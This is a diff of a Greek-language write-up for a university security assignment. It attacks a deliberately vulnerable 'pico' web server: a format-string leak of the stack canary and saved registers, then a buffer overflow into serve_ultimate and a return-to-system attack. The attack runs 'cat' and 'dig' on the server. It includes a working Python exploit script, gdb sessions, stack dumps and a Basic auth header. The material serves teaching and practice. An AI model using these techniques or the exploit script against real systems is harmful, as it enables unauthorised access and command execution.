@@ -242,7 +242,7 @@ grep -v "https://en.wikipedia.org/wiki/The_Conversation" firefox.log > out.txt
 +  */
 +
 ```
-Έτσι φτάσαμε στις οδηγίες για την εύρεση των συντεταγμένων όπου για **< team name>** βάλαμε το όνομα της ομάδας μας "**hackerz**" και βρήκαμε τις συντεταγμένες:
+Έτσι φτάσαμε στις οδηγίες για την εύρεση των συντεταγμένων όπου για **\<team name>** βάλαμε το όνομα της ομάδας μας "**hackerz**" και βρήκαμε τις συντεταγμένες:
 > 47.5284864714, 4.8260977302
 
 ## Ερώρημα 2
@@ -309,7 +309,7 @@ print('\n\n')
 
 Μετά από μερικές προσπάθειες βρήκαμε τα στοιχεία του πρώτου χρήστη (ήταν της μορφής **name:md5(password)**) που βρίσκονταν στο αρχείο **passwd**. 
 
-Μεταφέραμε ακριβώς το ίδιο input (**%08x %08x %08x %08x %08x %08x %s**) στο server της άσκησης και το output ήταν το παρακάτω: 
+Μεταφέραμε ακριβώς το ίδιο input (**%08x %08x %08x %08x %08x %08x %s**) στον server της άσκησης και το output ήταν το παρακάτω: 
 
 > http://4tpgiulwmoz4sphv.onion is requesting your username and
 > password. The site says: “Invalid user:  5807d010 15 5656951d ffffffff
@@ -345,29 +345,151 @@ Love you big time!
 ## Ερώρημα 3
 Για να απαντήσουμε την ερώτηση "**Ποια ειναι τα results του "Plan Y";**" ακολουθήσαμε την παρακάτω διαδικασία:
 
-Παρατηρήσαμε ότι το input που δίναμε το έπαιρνε  η συνάρτηση **memcpy** για να το αντιγράψει στον πίνακα **post_data** και για μήκος χρησιμοποιούσε τo μήκος του input + 1 (payload_size + 1). Οπότε αν δίναμε είσοδο πάνω από 100 χαρακτήρες η memcpy θα έκανε πάνω από 100 αντιγραφές με αποτέλεσμα να μπορούμε να κάνουμε buffer overflow.
+Έχοντας αποκτήσει πρόσβαση στο site http://4tpgiulwmoz4sphv.onion από το προηγούμενο ερώτημα, είδαμε στο κάτω μέρος της λευκής σελίδας τα παρακάτω χρήσιμα tips:
+```
+PS1. Neat trick, run this (with the tor browser open) and you can access
+foo.onion with a normal browser under http://localhost:8000
+
+socat TCP4-LISTEN:8000,bind=127.0.0.1,fork SOCKS4A:localhost:foo.onion:80,socksport=9150
+
+PS2. As always a big part of the YS13 mission is research. Reaching Saturn is not easy.
+Lately we've been finishing the experiments for "Plan Y" which is finding the actual value of the ultimate coefficient.
+Check the page below for some preliminary results. This is strictly for admins now so as to not
+further destabilize the space-plant continuum.
+```
+καθως και μια **φόρμα εισόδου** η οποία κάνει post request στο path http://4tpgiulwmoz4sphv.onion/ultimate.html. Ετσι αρχίσαμε να βλέπουμε λίγο τον κώδικα του [pico server](https://github.com/chatziko/pico) για να καταλάβουμε την ροή που θα ακολουθήσει για να επεξεργαστεί το request και τέλος να στείλει κάποιο αποτέλεσμα πίσω στον client. 
+
+Αρχικά ο server οταν ξεκινάει, καλεί την συνάρτηση **server_forever** η οποία περιμένει συνδέσεις στην θύρα **8080** χρησιμοποιώντας την blocking συνάρτηση **accept**. Τη στιγμή που θα έρθει κάποιο αίτημα, η κατάσταση του process θα αλλάξει από **block**/**wait** σε **running** ξανά και αμέσως μετά θα γίνει **fork** έτσι ώστε να εξυπυρετήσει τον **client** στον κώδικα του child process. Στη συνέχεια το child process θα καλέσει τη συνάρτηση **respond** η οποία αναλαμβάνει να χειριστεί το request, να θέσει το standard output να πηγαίνει κατευθείαν στο **socket** εκτελώντας την εντολή:
+```c
+dup2(clientfd, STDOUT_FILENO);
+```
+και να καλέσει την συνάρτηση **route** η οποία θα εξετάσει τα **headers** του request για να ελέγξει ποιο path ζητάει να δει ο client καθώς και αν είναι προστατευμένο με κωδικό. 
+
+Στην περίπτωση του path http://4tpgiulwmoz4sphv.onion/ultimate.html η route πρέπει να τρέξει τον παρακάτω κώδικα: (main.c:50)
+```c
+ROUTE_POST("/ultimate.html") {  
+  // An extra layer of protection: require an admin password in POST  
+  Line admin_pwd[1];  
+  read_file("/etc/admin_pwd", admin_pwd, 1);  
+  
+ char* given_pwd = post_param("admin_pwd");  
+ int allowed = given_pwd != NULL && strcmp(admin_pwd[0], given_pwd) == 0;  
+  
+ if (allowed)  
+    serve_ultimate();  
+ else  printf("HTTP/1.1 403 Forbidden\r\n\r\nForbidden");  
+  
+  free(given_pwd);  
+}
+```
+και αν περάσει ο έλεγχος του password να εκτελεστεί η συνάρτηση **server_ultimate** η οποία αναλαμβάνει να στείλει πίσω στον client το περιεχόμενο του αρχείου **ultimate.html**.
+
+Για να γίνει αυτό, πρέπει να κληθεί η συνάρτηση **post_param** (main.c:169) η οποία αναλαμβάνει να κάνει parse το payload για να πάρει την τιμή της παραμέτρου **admin_pwd** και να την επιστρέψει ώστε να γίνει η σύγκριση. 
+
+**post_param (main.c:169):**
+```c
+// Parses and returns (in new memory) the value of a POST param  
+char* post_param(char* param_name) {  
+  // These are provided by pico:  
+ //  payload      : points to the POST data //  payload_size : the size of the paylaod  
+ // The POST data are in the form name1=value1&name2=value2&... // We need NULL terminated strings, so change '&' and '=' to '\0' // (copy first to avoid changing the real payload).  
+  char post_data[100];  
+  memcpy(post_data, payload, payload_size+1);  
+  
+ for (int i = 0; i < payload_size; i++)  
+    if (post_data[i] == '&' || post_data[i] == '=')  
+      post_data[i] = '\0';  
+  
+  // Now loop over all name=value pairs  
+  char* value;  
+ for (  
+    char* name = post_data;  
+  name < &post_data[payload_size];  
+  name = &value[strlen(value) + 1]      // the next name is right after the value  
+  ) {  
+    value = &name[strlen(name) + 1]; // the value is right after the name  
+  if (strcmp(name, param_name) == 0)  
+      return strdup(value);  
+  }  
+  
+  return NULL; // not found  
+}
+```
+Παρατηρήσαμε ότι το input που δίναμε το έπαιρνε  η συνάρτηση **memcpy** για να το αντιγράψει στον πίνακα **post_data** και για μήκος χρησιμοποιούσε τo μήκος του input + 1 (payload_size + 1 ). Οπότε αν δίναμε είσοδο πάνω από 100 χαρακτήρες η **memcpy** θα έκανε πάνω από 100 αντιγραφές με αποτέλεσμα να μπορούμε να κάνουμε **buffer overflow**.
+
+### Ανάλυση επίθεσης
 
 Στη συνέχεια τρέξαμε τον server με gdb για δούμε την δομή της στοίβας στο frame της συνάρτησης **post_param**.
 
-Είδαμε ότι μετά τα 100 στοιχεία του buffer ήταν το **canary**, **δυο ίδιες διευθύνσεις σταθερές**, o **saved $ebp** και o **saved $eip**. 
+Αμέσως μετά κάναμε κλήση της συνάρτησης memset όπως φαίνεται παρακάτω ώστε να γεμίσουμε τον buffer με 'Α' για να μας είναι πιο ξεκάθαρο το περιεχόμενο του frame:
+```bash
+>>> call memset(post_data, 'A', 100)
+```
+Οπότε τώρα το frame της συνάρτησης **post_param** φαίνεται κάπως έτσι:
+```bash
+>>> x/39xw $sp
+0xbfffee60:	0xb7c86117	0x00417188	0x00000000	0x0040239f
+0xbfffee70:	0x00417188	0x00000000	0xb7c88b19	0xb7dcd000
+0xbfffee80:	0x00417188	0x00000000	0x41414141	0x41414141
+0xbfffee90:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbfffeea0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbfffeeb0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbfffeec0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbfffeed0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbfffeee0:	0x41414141	0x41414141	0x41414141	0x786f3100
+0xbfffeef0:	0x00404000	0x00404000	0xbfffef98
+```
+Έτσι, είδαμε ότι μετά τα 100 στοιχεία του buffer ήταν το **canary (0x786f3100)** , **δυο ίδιες διευθύνσεις σταθερές (0x00404000)**, και o **saved $ebp (0xbfffef98)**.  Αν εκτυπώναμε 40 hex words, θα βλέπαμε στο τέλος και τον **saved $eip**.
 
-Σκοπός μας ήταν να αλλάξουμε τη διεύθυνση του **saved $eip**, να κάνουμε την συνάρτηση **post_param** να επιστρέψει μεσα στο if(allowed) και να κληθεί η συνάρτηση **serve_ultimate()**. Εν τέλη αποφασίσαμε να κάνουμε την συνάρτηση **post_param** να επιστρέψει μέσα στην συνάρτηση **serve_ultimate**.
+Το επόμενο word μετά από τον **saved $ebp** είναι ο **saved $eip** και για να τον τυπώσουμε χρησιμοποιήσαμε την παρακάτω εντολή:
 
-Για αρχή αλλάξαμε την τιμή του **saved $eip** από τον **gdb**, της δώσαμε την τιμή της διεύθυνσης εντολής **<serve_ultimate+18>** και πράγματι ο κώδικας συνέχισε να εκτελείται από εκείνη την εντολή και μετά, δηλαδή μέσα στην συνάρτηση **serve_ultimate** με αποτέλεσμα να δούμε τα περιεχόμενα του αρχείου **ultimate.html**
+```bash
+>>> x/a $ebp + 4
+0xbfffeefc:	0x401193 <route+384>
+```
+### Επίθεση
 
-Για να γίνει το attack έπρεπε να κάνουμε ένα buffer overflow στο οποίο όλα τα στοιχεία μετά τον buffer θα παραμείνουν ίδια εκτός από τον **saved $eip**. Για αυτό το λόγο έπρεπε να ξέρουμε την τιμή του **canary**, του  **saved $ebp** και τις **2 ενδιάμεσες διευθύνσεις** (που ήταν ίσες) που είχαμε παρατηρήσει ότι παραμένανε σταθερές. 
+Σκοπός μας ήταν να αλλάξουμε τη διεύθυνση του **saved $eip**, να κάνουμε την συνάρτηση **post_param** να επιστρέψει μεσα στο **if(allowed)** και να κληθεί η συνάρτηση **serve_ultimate**. Εν τέλη αποφασίσαμε να κάνουμε την συνάρτηση **post_param** να επιστρέψει μέσα στην συνάρτηση **serve_ultimate**. Επομένως, αλλάξαμε την τιμή του **saved $eip** από τον **gdb**, της δώσαμε την τιμή της διεύθυνσης εντολής **<serve_ultimate+18>** και πράγματι ο κώδικας συνέχισε να εκτελείται από εκείνη την εντολή και μετά, δηλαδή μέσα στην συνάρτηση **serve_ultimate** με αποτέλεσμα να δούμε τα περιεχόμενα του αρχείου **ultimate.html**.
 
-Χρησιμοποιήσαμε την vulnerable printf του ερωτήματος 2 και τυπώσαμε το frame της **check_auth** όπως αυτό εμφανίζεται στη στοίβα. 
+Για να γίνει το attack έπρεπε να κάνουμε ένα buffer overflow στο οποίο όλα τα στοιχεία μετά τον buffer θα παραμείνουν ίδια εκτός από τον **saved $eip**. Για αυτό το λόγο έπρεπε να ξέρουμε την τιμή του **canary**, του  **saved $ebp** και τις **2 ενδιάμεσες διευθύνσεις** που είχαμε παρατηρήσει ότι παρέμεναν σταθερές. 
 
-Το **saved $ebp** είναι το ίδιο γιατί γυρνάνε στην ίδια συνάρτηση (route) και το Canary ειναι επίσης το ίδιο για όλες τις συναρτήσεις του προγράμματος. 
+Για να βρούμε τις τιμές που χρειαζόταν να παραμένουν ίδιες, χρησιμοποιήσαμε την **vulnerable printf** του ερωτήματος 2 και τυπώσαμε το frame της **check_auth** όπως αυτό εμφανίζεται στη στοίβα. Για μάθουμε το μέγεθος του, τρέξαμε την εντολή:
 
-Παρατηρήσαμε επίσεις πως η μια από τις 2 ενδιάμεσες διευθύνσεις ήταν ίδια με τις 2 ενδιάμεσες διευθύνσεις του frame του post_param.
+```bash
+>>> p ($ebp - $esp) / 4
+```
+στο shell του gdb, το οποίο μας έφερε το αποτέλεσμα 31 έτσι βρήκαμε τον αριθμό των words του frame και ξέραμε πόσα **%x** να βάλουμε ως είσοδο στην **vulnerable printf** για να δούμε το frame, επίσης προσθέσαμε αλλο ένα **%x** για να μας γυρίσει τον **saved $eip**
 
-Στη συνέχεια τυπώσαμε το frame της check_auth + την επόμενη διεύθυνση (saved $eip) από τον remote server, οπότε είχαμε το canary, την αντίστοιχη διεύθυνση της σταθερής διεύθυνσης που θέλαμε, τον saved $ebp και τον saved $eip, βρήκαμε και τον αντίστοιχο local saved $eip και τον αφαιρέσαμε από τον saved $eip του remote server, έτσι είχαμε το offset ανάμεσα στον local server και στον remote server. Προσθέσαμε αυτό το offset στην διεύθυνση της εντολής **<serve_ultimate+18>** και βρήκαμε την διεύθυνσή της στο remote server. Τέλος σχεδιάσαμε το input, το οποίο ήταν της μορφής:
+Το αποτέλεσμα της printf ήταν:
+
+```
+00417010 0000009b 004014ba ffffffff 00000d00 00407161 00404260 b7fff000 b7fff918 00417010 000000a2 00000000 00000001 00417010 004170ab 004170ac 0000009b b7c26da8 b7fd5480 b7fe4a70 00400540 00000001 b7fff918 004040cc b7fe98a2 b7fffad0 786f3100 b7c831d7 00404000 bfffef98 00401085
+```
+όπως φαίνεται και στο output, 
+1) το **canary** (**786f3100**) είναι το ίδιο. 
+2) διακρίνουμε τη σταθερή τιμή (**00404000**).
+3) το **saved $ebp**  (**bfffef98**) είναι το ίδιο όπως περιμέναμε αφού και οι 2 συναρτήσεις επιστρέφουν στη συνάρτηση **route()**.
+
+Επαναλάβαμε τη διαδικασία με την printf στον remote server αυτή τη φορά και έτσι μάθαμε τις διευθύνσεις που μας ενδιέφεραν.
+
+```
+58628010 0000009b 5664151d ffffffff 00000d00 58618161 56644260 f77d5000 f77d5918 58628010 000000a2 00000000 00000001 58628010 586280ab 586280ac 0000009b f7408da8 f77ad480 f77baa70 56640550 00000001 f77d5918 566440cc f77bf8a2 f77d5ad0 61fdc200 f74651d7 56644000 ffff8b68 566410e8
+```
+
+1) το **canary** έχει την τιμή **61fdc200**. 
+2) η αντίστοιχη σταθερή τιμή είναι η **00404000**.
+3) ο αντίστοιχος **saved $ebp**  είναι ο **ffff8b68**
+4) ο saved $eip είναι ο **566410e8**
+
+Το μόνο που χρειαζόμασταν ήταν η διεύθυνση της εντολής **<serve_ultimate+18>** στον remote server. 
+
+Για να την υπολογίσουμε χρειαζόμασταν τη διαφορά (**offset**) της remote διευθυνσης από την local διεύθυνση. Για να βρούμε τη διαφορά, αφαιρέσαμε από τη διεύθυνση του **saved $eip** στο remote server την διευθυνση του **saved $eip** στον local server και το αποτέλεσμα το προσθέσαμε στη διεύθυνση της **<serve_ultimate+18>** στο local server.
+
+### Τελική επίθεση
+
+Τέλος σχεδιάσαμε το input που θα κάναμε το attack, το οποίο ήταν της μορφής:
 
 > 'Α' * 100 + Canary + Constant address * 2 + Saved $ebp + <serve_ultimate+18> address
-
-Με αυτό το input, καταφέραμε να κάνουμε το exploit.
 
 Για να κάνουμε τις δοκιμές στον remote server, τρέξαμε την εντολή socat:
 ```bash
@@ -407,7 +529,7 @@ print("text = [" + response.text+ "]")
 except requests.exceptions.RequestException as e:
 print(e)
 ```
-Response:
+Τα results του “Plan Y” είναι:
 
  > Results:
 > 
@@ -418,9 +540,14 @@ Response:
 > 
 > The log is here: /var/log/z.log
 
+### Debugging
+Ο server κάνει **fork** για κάθε αίτημα από τον client όπως αναφέρθηκε παραπάνω και ο target κώδικας που μας ενδιέφερε για να κάνουμε το **buffer overflow** είναι κώδικας που τον τρέχει το child process με αποτέλεσμα, κάθε φορά που θέλαμε να σταματήσουμε στην εντολή **memcpy** (main.c:179) με breakpoint να χρειάζεται πρώτα να σταματήσουμε κάπου πριν γίνει το **fork** (πχ httpd.c:58) και μετά με την gdb εντολή:
+```bash
+set follow-fork-mode child
+```
+να τον ενημερώσουμε πως αν γίνει fork να ακολουθήσει (attach) το child process. Επειδή έπρεπε συνέχεια να δίνουμε συγκεκριμένες εντολές για να το πετύχουμε αυτό, δημιουργήσαμε το παρακάτω script όπου αυτοματοποιεί λίγο την διαδικασία του debug.
 
-
-**debug.sh:**
+**debug.sh:** 
 ```bash
 #!/bin/sh
 make
@@ -442,29 +569,207 @@ gdb\
 -ex 'x/a $ebp + 4'\
 ./picoserver
 ```
+Το παραπάνω script κάνει compile τον server, κάνει kill αν υπάρχει ανοικτό process και τρέχει τον gdb με τις εξής εντολές:
+1) Εισαγωγή breakpoints
+2) run
+3) Ενημερώνει τον gdb να κάνει αυτόματα attach στο πρώτο fork
+4) continue
+5) Εκτύπωση του frame της post_param οπως εμφανίζεται στη στοίβα. 
+6) Εκτύπωση του saved $eip.
 
-**Χρήσιμες εντολές gdb:**
+**Επιπλέον χρήσιμες εντολές gdb:**
 Υπολογισμός του offset της διεύθυνσης του remote server σε σχέση με την διεύθυνση του local server:
-
-    call fprintf(stderr, "%p\n", [remote address] - [local address])
-
-Υπολογισμός του διεύθυνσης εντολής:
-
-    call fprintf(stderr, "%p\n", [local address of command] + offset)
-
+```bash
+call fprintf(stderr, "%p\n", [remote address] - [local address])
+```
+Υπολογισμός του offset διεύθυνσης εντολής:
+```bash
+call fprintf(stderr, "%p\n", [local address of command] + offset)
+```
 Επαλήθευση σωστής διεύθυνσης εντολής
-
-    x/a 0x0040190a
-
+```bash
+x/a 0x0040190a
+```
 Επανασύνδεση του gdb με την γονική διεργασία:
-
-    attach [PID]
- 
+```bash
+attach [PID]
+```
 Υπολογισμός λέξεων που καταλαμβάνει το τρέχον frame:
+```bash
+p ($ebp - $esp) / 4
+```
+Εκτύπωση του τρέχοντος frame σε λέξεις:
+```bash
+x/40xw $sp
+```
+## Ερώρημα 4
+Για να απαντήσουμε την ερώτηση "**Ποιο είναι το code του "Plan Z";**" ακολουθήσαμε την παρακάτω διαδικασία:
 
-    p ($ebp - $esp) / 4 // <-- 40
-Εκτύπωση του τρέχον frame σε λέξεις:
+### Ανάλυση επίθεσης
 
-    x/40xw $sp
+Παρατηρήσαμε πως τα results του προηγούμενου ερωτήματος αναφέρονται σε κάποιο αρχείο **z.log**:
+> The log is here: /var/log/z.log
 
+έτσι δοκιμάσαμε τρόπους να κάνουμε access αυτό το αρχείο και καταλήξαμε στο συμπέρασμα πως για να γίνει αυτό θα χρειαστεί να τρέξουμε κάποια εντολή συστήματος (πχ cat). Όμως πως θα γίνει αυτό τη στιγμή που δεν έχουμε shell access στο μηχάνημα που τρέχει ο server;
+
+Η λύση ήταν να κάνουμε ξανά **buffer overflow** στο ίδιο σημείο που το κάναμε και στο προηγούμενο ερώτημα αλλά αυτή τη φορά με διαφορετική είσοδο. Σκοπός μας ήταν να τρέξουμε την εντολή **system** η οποία παίρνει ως όρισμα μια συμβολοσειρά (char *) που περιέχει την εντολή που πρόκειται να εκτελεστεί. 
+
+Ξέραμε ότι αν τρέξουμε την εντολή:
+```bash
+cat /var/log/z.log
+```
+μέσω της **system** η οποία κάνει fork και exec, θα δούμε με επιτυχία τα αποτελέσματα στο response γιατί όπως έχουμε δει και από το μάθημα '**Προγραμματισμός συστήματος**', όταν γίνεται fork μια διεργασία στην πραγματικότητα γίνεται αντιγραφή όλου του προγράμματος όπως ήταν εκείνη τη στιγμή στη μνήμη σε ένα νέο process και η εκτέλεση συνεχίζει από το σημείο που έγινε το fork και μετά. 
+
+Επιπλέον, μαζί με τα περιεχόμενα της μνήμης του προγράμματος, το child process κληρονομεί ένα αντίγραφο των ανοικτών **file descriptors**. Αυτό σε συνδιασμό με την εντολή **dup2(clientfd, STDOUT_FILENO)** έχει ως αποτέλεσμα το standard output οποιασδήποτε εντολής δώσουμε να πηγαίνει κατευθείαν στον client. 
+
+Οπότε αν τρέχαμε την εντολή cat θα βλέπαμε τα περιεχόμενα του αρχείου **z.log** στον client.
+
+Τελος, καταλήξαμε στο συμπέρασμα πως πρέπει να κάνουμε την συνάρτηση **post_param** να επιστρέψει στην συνάρτηση **system**, για να γίνει αυτό έπρεπε:
+1)  να μάθουμε με gdb την διεύθυνση που βρίσκεται η system στο **.text** του προγράμματος, 
+2) να κάνουμε overwrite τον **saved $eip** της **post_param** με αυτή τη διεύθυνση,
+3) να κάνουμε overwrite το αμέσως επόμενο word μετά τον **saved $eip** (\$ebp+8) με την τιμή ενός δείκτη σε συμβολοσειρά που θα περιέχει την εντολή προς εκτέλεση καθως και 
+4) να βάλουμε την συμβολοσειρά κάπου στην στοίβα για να δούμε αν θα λειτουργήσει.
+
+### Επίθεση
+Για να κάνουμε την επίθεση, πήραμε το request.py script που είχαμε χρησιμοποιήσει και στο προηγούμενο ερώτημα και το κάναμε να δέχεται hex words.
+
+**hex_words_request.py**
+
+```python
+import requests
+
+headers = {
+    'U': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:77.0) Gecko/20100101 Firefox/77.0',
+    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+    'Accept-Language': 'en-US,en;q=0.5',
+    'Content-Type': 'application/x-www-form-urlencoded',
+    'Origin': 'http://127.0.0.1:8080',
+    'Authorization': 'Basic YWRtaW46eW91IHNoYWxsIG5vdCBwYXNz',
+    'Connection': 'keep-alive',
+    'Referer': 'http://127.0.0.1:8080/',
+    'Upgrade-Insecure-Requests': '1',
+}
+
+data = b'A' * 100  # <-- buffer check
+ba = bytearray.fromhex("fcd7c600") # <-- canary
+ba.reverse()
+data += ba  
+data += b'A' * 12  # <-- saved $ebp check 0xbfffef98
+ba = bytearray.fromhex("b7c55da0") # <-- saved eip
+ba.reverse()
+data += ba
+ba = bytearray.fromhex("bfffee14")  # <-- char**
+ba.reverse()
+data += ba
+ba = bytearray.fromhex("bfffee18") # <-- char*
+ba.reverse()
+data += ba
+data += b"cat /var/log/z.log"
+
+data += b'\x00'
+print(data)
+try:
+    response = requests.post('http://127.0.0.1:8080/ultimate.html', headers=headers, data=data)
+    status_code = response.status_code
+    print("status_code = [" + str(status_code) + "]")
+    print("text = [" + response.text + "]")
+except requests.exceptions.RequestException as e:
+    print(e)
+```
+
+
+Δοκιμάζοντας το, πράγματι πέτυχε το attack αλλά μας έφερνε μόνο την πρώτη γραμμή από το αρχείο με την εντολή **cat** επειδή το συγκεκριμένο python module (requests) είναι σχεδιασμένο να λειτουργεί με τους κανόνες του **HTTP** πρωτοκόλλου και το response απο τον server ερχόταν χωρίς να τους τηρει γιατί έλειπε το HTTP/1.1 200 OK\r\n\r\n λόγω της επίθεσης. Έτσι, αποφασίσαμε να χρησιμοποιήσουμε κάποια άλλη εντολή που να επιστρέφει όλο το περιεχόμενο του αρχείου χωρίς αλλαγές γραμμής και είδαμε την παρακάτω η οποία μας φάνηκε αρκετά χρήσιμη:
+```bash
+paste -sd, /var/log/z.log
+```
+Αναπαράσταση της στοίβας μετά το buffer overflow:
+```text
+Stack:
+			  ...........
+			  ...........
+			  ...........
+0xbfffef24	+-------------+
+			| 0x70617374  | <- 'past'
+0xbfffef20  +-------------+
+			| 0x65202d73  | <- 'e -s'
+0xbfffef1c  +-------------+
+			| 0x642c202f  | <- 'd, /'
+0xbfffef18  +-------------+
+			| 0x7661722f  | <- 'var/'
+0xbfffef14  +-------------+
+			| 0x6c6f672f  | <- 'log/'							(--- route frame ---)
+0xbfffef10  +-------------+
+			| 0x7a2e6c6f  | <- 'z.lo'
+0xbfffef0c  +-------------+
+			| 0x67000000  | <- 'g\0'
+0xbfffef08  +-------------+  
+			| 0xbfffef24  | <- pointer to char* command
+0xbfffef04  +-------------+
+			| 0xbfffef08  | <- pointer to char** command (before: is char *param_name)
+0xbfffef00  +-------------+  
+			| 0xb7c55d3d  | <- saved $eip, <__libc_system+0> (before: is 0x401193 <route+384>)
+0xbfffeefc  +-------------+ <==================== $ebp
+			| 0xbfffef98  | <- saved $ebp
+0xbfffeef8  +-------------+
+			| 0x00404000  | <- static address
+0xbfffeef4  +-------------+		
+			| 0x00404000  | <- static address					(--- post_data frame ---)
+0xbfffeef0  +-------------+
+			| 0x786f3100  | <- canary
+0xbfffeeec	+-------------+
+			| 0x41414141  |
+			| . . . . . . | <- post_data buffer (100 bytes)
+			| 0x41414141  |
+0xbfffee88  +-------------+ <==================== $esp
+			  ...........
+			  ...........
+			  ...........
+```
+
+Επειδή στην συγκεκριμένη επίθεση κάνουμε την συνάρτηση **post_param** να επιστρέψει κατευθείαν μέσα στον κώδικα της **system** και η system για να εκτελέσει την εντολή που της δώσαμε κάνει **fork** και την εκτελεί στον child κώδικα με **exec**, δεν χρειάστηκε να δώσουμε σωστή τιμή για τον **saved $ebp** γιατί το output της εντολής θα το βλέπαμε κανονικά ακόμα και αν το child process που εξυπηρετεί το request κρασάρει.
+
+Τα περιεχόμενα του αρχείου **z.log**:
+```
+Computing, approximate answer: 41.9933411112233311
+...
+
+
+
+Plan Z: troll humans who ask stupid questions (real fun).
+I told them I need 7.5 million years to compute this :D
+
+In the meanwhile I\'m travelling through time trolling humans of the past.
+Currently playing this clever dude using primitive hardware
+ he\'s good but the
+next move is crushing...
+
+1.e4 c6 2.d4 d5 3.Nc3 dxe4 4.Nxe4 Nd7 5.Ng5 Ngf6 6.Bd3 e6 7.N1f3 h6 8.Nxe6 Qe7 9.0-0 fxe6 10.Bg6+ Kd8 11.Bf4 b5 12.a4 Bb7 13.Re1 Nd5 14.Bg3 Kc8 15.axb5 cxb5 16.Qd3 Bc6 17.Bf5 exf5 18.Rxe7 Bxe7
+
+PS. To reach me in the past use the code: "<next move><public IP of this machine>"
+
+PS2. To know a fish go to the water; to know a bird\'s song go to the mountains.\n'
+```
+
+Όταν είδαμε τα περιεχόμενα του αρχείου θέλαμε να υπολογίσουμε το \<**next move**>. Για τον υπολογισμό του, αρχικά νομίζαμε ότι ήταν κάποιο cipher text και δοκιμάσαμε διάφορους αλγόριθμους που έχουν αναφερθεί στο μάθημα χωρίς επιτυχία. 
+
+Τέλος μετά από ψάξιμο στο google καταλήξαμε στο συμπέρασμα ότι είναι συντεταγμένες κινήσεων στο σκάκι για τον διάσημο αγώνα ***Deep Blue (Computer) vs Garry Kasparov***. :D
+
+Στην επόμενη κίνηση το Deep Blue νίκησε "**19.c4 1-0**", οπότε το  \<**next move**> ηταν το "**c4**". 
+
+Για την **public ip** κάναμε ακριβώς την ίδια επίθεση όπως στην αρχή του βήματος, αυτή τη φορά όμως αλλάξαμε το command που δώσαμε στη συνάρτηση system σε:
+```bash
+dig +short myip.opendns.com @resolver1.opendns.com
+```
+ώστε να βρούμε την public ip η οποία ήταν η "**3.85.143.73**". 
+
+Βάλαμε το **c4** στην αρχή της και καταλήξαμε πως:
+
+"\<**next move**>\<**public IP of this machine**>":  "**c43.85.143.73**"
+
+Επομένως τo code του Plan Z είναι το "**c43.85.143.73**"
+
+##
+Ευχαριστούμε! :D
+
+##
 Σημείωση: Τα python scripts είναι γραμμένα σε **python3**.
